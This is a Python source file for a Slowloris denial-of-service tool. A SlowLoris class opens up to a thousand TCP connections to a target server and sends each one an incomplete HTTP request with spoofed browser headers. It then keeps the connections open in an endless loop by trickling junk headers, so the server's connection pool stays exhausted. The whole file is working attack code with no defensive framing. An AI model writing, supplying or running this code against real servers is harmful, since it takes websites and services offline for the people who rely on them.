import socket
import random
from time import sleep

from core.main import SocketAttacker

REGULAR_HEADERS = ["User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
                   "Accept-language: en-US,en,q=0.5"]


class SlowLoris(SocketAttacker):
    def __init__(self, address, sockets_to_keep=1000, keep_connection_timeout=5):
        super().__init__(address)
        self._sockets_to_keep = sockets_to_keep
        self._sockets_list = []
        self._keep_connection_timeout = keep_connection_timeout

    def get_socket(self):
        soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        soc.settimeout(5)
        return soc

    def run(self) -> None:
        self.fill_sockets_list()
        while True:
            for soc in self._sockets_list:
                try:
                    self.send_keep_alive_data(soc)
                except socket.error:
                    self._sockets_list.remove(soc)
                    self.init_socket_connection()
            self.fill_sockets_list()
            sleep(self._keep_connection_timeout)

    def fill_sockets_list(self) -> None:
        """
        Tryes to fill connections to maximum
        """
        for i in range(self._sockets_to_keep - len(self._sockets_list)):
            try:
                soc = self.init_socket_connection()
                self._sockets_list.append(soc)
            except socket.error:
                break

    def init_socket_connection(self) -> socket.socket:
        """
        Initiate connection and send initial data
        """
        address = self.address.get_address()
        port = int(self.address.get_port())
        soc = self.get_socket()
        soc.connect((address, port))
        soc.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode('UTF-8'))
        for header in REGULAR_HEADERS:
            soc.send(f"{header}\r\n".encode("UTF-8"))
        return soc

    @staticmethod
    def send_keep_alive_data(soc) -> None:
        """
        Sending keep alive connection to prevent server to close connection
        """
        soc.send(f"X-a {random.randint(1, 5000)}\r\n".encode('UTF-8'))

    def print_opened_sockets_number(self):
        print(f'Currently opened {len(self._sockets_list)} connections')
